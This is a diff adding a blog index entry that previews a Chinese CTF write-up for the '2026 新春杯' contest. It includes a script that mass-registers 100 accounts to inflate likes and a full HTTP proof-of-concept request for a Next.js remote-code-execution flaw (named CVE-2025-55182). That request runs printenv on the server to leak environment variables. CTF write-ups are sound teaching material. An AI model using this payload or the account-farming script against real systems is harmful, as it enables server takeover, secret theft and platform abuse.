@@ -153,6 +153,22 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">2026 新春杯 WP
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Web 够了够了，谢谢大家 写脚本注册 100 个账号并登录点赞，由于需要保持登录状态，所以需要用 requests.session() 来保持会话：
+import requests import time register_url = &#34;http://175.27.251.122:33994/register.php&#34; login_url = &#34;http://175.27.251.122:33994/login.php&#34; like_url = &#34;http://175.27.251.122:33994/weechatt.php&#34; for i in range(100): session = requests.session() response = session.post(register_url, data={ &#34;username&#34;: f&#34;user{i}&#34;, &#34;password&#34;: &#34;123456&#34; }) time.sleep(0.3) session.post(login_url, data={ &#34;username&#34;: f&#34;user{i}&#34;, &#34;password&#34;: &#34;123456&#34; }) time.sleep(0.3) session.post(like_url, data={ &#34;like&#34;: &#34;&#34; }) time.sleep(0.3) Arknights_solver 看到提示“cve”，看下源码有哪些技术栈，发现用了 next.js，查一下应该是 CVE-2025-55182 漏洞。
+抄一下 https://blog.csdn.net/lingggggaaaa/article/details/155617904 的有回显 poc，改一下：
+POST / HTTP/1.1 Host: 192.168.0.143:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0 Next-Action: x X-Nextjs-Request-Id: b5dce965 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9 Content-Length: 753 ------WebKitFormBoundaryx8jO2oVc6SWP3Sad Content-Disposition: form-data; name=&#34;0&#34; { &#34;then&#34;: &#34;$1:__proto__:then&#34;, &#34;status&#34;: &#34;resolved_model&#34;, &#34;reason&#34;: -1, &#34;value&#34;: &#34;{\&#34;then\&#34;:\&#34;$B1337\&#34;}&#34;, &#34;_response&#34;: { &#34;_prefix&#34;: &#34;var res=process.mainModule.require(&#39;child_process&#39;).execSync(&#39;printenv&#39;,{&#39;timeout&#39;:5000}).toString().trim();;throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;), {digest:`${res}`});&#34;, &#34;_chunks&#34;: &#34;$Q2&#34;, &#34;_formData&#34;: { &#34;get&#34;: &#34;$1:constructor:constructor&#34; } } } ------WebKitFormBoundaryx8jO2oVc6SWP3Sad Content-Disposition: form-data; name=&#34;1&#34; &#34;$@0&#34; ------WebKitFormBoundaryx8jO2oVc6SWP3Sad Content-Disposition: form-data; name=&#34;2&#34; [] ------WebKitFormBoundaryx8jO2oVc6SWP3Sad-- 我试过 cat /flag，发现没有这个文件， find 了一下也没有，试试 printenv，在环境变量里找到了 flag
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-02-08 22:43:14 +0800 CST'>2026/02/08</span>&nbsp;·&nbsp;<span>6 min</span>&nbsp;·&nbsp;<span>1142 words</span>&nbsp;·&nbsp;<span>ok-komputer</span></footer>
+  <a class="entry-link" aria-label="post link to 2026 新春杯 WP" href="https://ok-komputer.github.io/posts/new-yer-cup-wp/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">2025 国赛 WP
     </h2>
   </header>
